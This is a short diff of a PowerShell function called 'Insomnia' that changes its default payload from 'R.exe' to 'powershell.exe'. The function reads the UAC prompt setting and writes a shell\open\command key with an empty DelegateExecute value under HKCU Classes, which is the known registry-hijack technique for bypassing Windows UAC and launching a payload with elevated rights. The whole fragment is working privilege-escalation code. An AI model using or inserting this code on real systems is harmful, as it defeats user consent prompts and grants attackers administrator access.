@@ -1,6 +1,6 @@
 function Insomnia{
 	[CmdletBinding()]
-	param([string]$payload='R.exe')
+	param([string]$payload='powershell.exe')
 
     #Get Windows Version
     $ver = [System.Environment]::OSVersion.Version.Major
@@ -9,7 +9,7 @@ function Insomnia{
 	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
 	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin
 
-	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='R.exe'){
+	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='powershell.exe'){
 		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
 		New-Item $regPath -Force
 		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
